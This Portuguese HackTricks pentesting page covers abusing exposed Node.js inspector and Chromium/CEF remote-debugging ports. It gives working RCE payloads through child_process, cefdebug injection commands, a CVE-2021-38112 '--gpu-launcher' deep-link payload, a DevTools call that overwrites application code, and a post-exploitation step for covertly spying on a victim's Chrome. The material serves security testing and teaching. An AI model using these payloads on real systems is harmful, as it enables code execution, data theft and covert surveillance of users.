# Abuso de depuração do Node inspector/CEF

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

## Informações Básicas

[A partir da documentação](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Quando iniciado com o interruptor `--inspect`, um processo Node.js escuta por um cliente de depuração. Por **padrão**, ele escutará no host e porta **`127.0.0.1:9229`**. Cada processo também é atribuído um **UUID** **único**.

Os clientes do inspector devem conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa terá a aparência de `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Uma vez que o **depurador tem acesso total ao ambiente de execução do Node.js**, um ator malicioso capaz de se conectar a esta porta pode ser capaz de executar código arbitrário em nome do processo Node.js (**possível escalonamento de privilégios**).
{% endhint %}

Existem várias maneiras de iniciar um inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando você inicia um processo inspecionado, algo assim irá aparecer:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processos baseados em **CEF** (**Chromium Embedded Framework**) como precisam usar o parâmetro: `--remote-debugging-port=9222` para abrir o **depurador** (as proteções SSRF permanecem muito semelhantes). No entanto, em vez de conceder uma sessão de **depuração** **NodeJS**, eles vão se comunicar com o navegador usando o [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), que é uma interface para controlar o navegador, mas não há um RCE direto.

Quando você inicia um navegador depurado, algo assim aparecerá:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navegadores, WebSockets e política de mesma origem <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites abertos em um navegador da web podem fazer solicitações WebSocket e HTTP sob o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um ID de sessão de depurador único**. A **política de mesma origem** **impede** que os sites consigam fazer **essa conexão HTTP**. Para segurança adicional contra [**ataques de rebinding DNS**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** o Node.js verifica que os **cabeçalhos 'Host'** para a conexão especificam um **endereço IP** ou **`localhost`** ou **`localhost6`** precisamente.

{% hint style="info" %}
Essas **medidas de segurança impedem a exploração do inspetor** para executar código apenas enviando uma solicitação HTTP (o que poderia ser feito explorando uma vulnerabilidade SSRF).
{% endhint %}

### Iniciando o inspetor em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo nodejs em execução para fazer com que ele **inicie o inspetor** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes, portanto, isso pode conceder a você **acesso privilegiado às informações dentro do processo** mas não uma escalada direta de privilégios.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Isso é útil em contêineres porque **desligar o processo e iniciar um novo** com `--inspect` não é uma **opção** pois o **contêiner** será **encerrado** com o processo.
{% endhint %}

### Conectar ao inspetor/debugger

Para se conectar a um **navegador baseado em Chromium**, as URLs `chrome://inspect` ou `edge://inspect` podem ser acessadas para Chrome ou Edge, respectivamente. Ao clicar no botão Configure, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Execução de Código Remoto (RCE):

![](<../../.gitbook/assets/image (674).png>)

Usando a **linha de comando**, você pode se conectar a um debugger/inspector com:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), permite **encontrar inspetores** em execução localmente e **injetar código** neles.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Note que os **exploits de RCE do NodeJS não funcionarão** se conectados a um navegador via [**Protocolo Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/) (você precisa verificar a API para encontrar coisas interessantes para fazer com ela).
{% endhint %}

## RCE no Depurador/Inspetor do NodeJS

{% hint style="info" %}
Se você veio aqui procurando como obter [**RCE a partir de um XSS no Electron, por favor, verifique esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Algumas maneiras comuns de obter **RCE** quando você pode **conectar** a um **inspetor Node** é usando algo como (parece que isso **não funcionará em uma conexão com o protocolo Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Cargas do Protocolo Chrome DevTools

Você pode verificar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Nesta seção, vou apenas listar coisas interessantes que encontro que as pessoas usaram para explorar esse protocolo.

### Injeção de Parâmetros via Links Profundos

No [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) a Rhino Security descobriu que uma aplicação baseada em CEF **registrou um URI personalizado** no sistema (workspaces://) que recebia o URI completo e então **lançava a aplicação baseada em CEF** com uma configuração parcialmente construída a partir desse URI.

Foi descoberto que os parâmetros do URI eram decodificados de URL e usados para lançar a aplicação básica do CEF, permitindo que um usuário **injetasse** a flag **`--gpu-launcher`** na **linha de comando** e executasse coisas arbitrárias.

Portanto, uma carga útil como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Sobrescrever Arquivos

Altere a pasta onde os **arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** frequentemente o **código-fonte** da aplicação com seu **código malicioso**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### RCE e exfiltração do Webdriver

De acordo com este post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) é possível obter RCE e exfiltrar páginas internas do theriver.

### Pós-Exploração

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um navegador baseado em Chrome/Chromium, você poderia iniciar um processo do Chrome com o **debugging ativado e encaminhar a porta de debug** para que você possa acessá-lo. Dessa forma, você será capaz de **inspecionar tudo o que a vítima faz com o Chrome e roubar informações sensíveis**.

A maneira furtiva é **encerrar todos os processos do Chrome** e então chamar algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referências

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
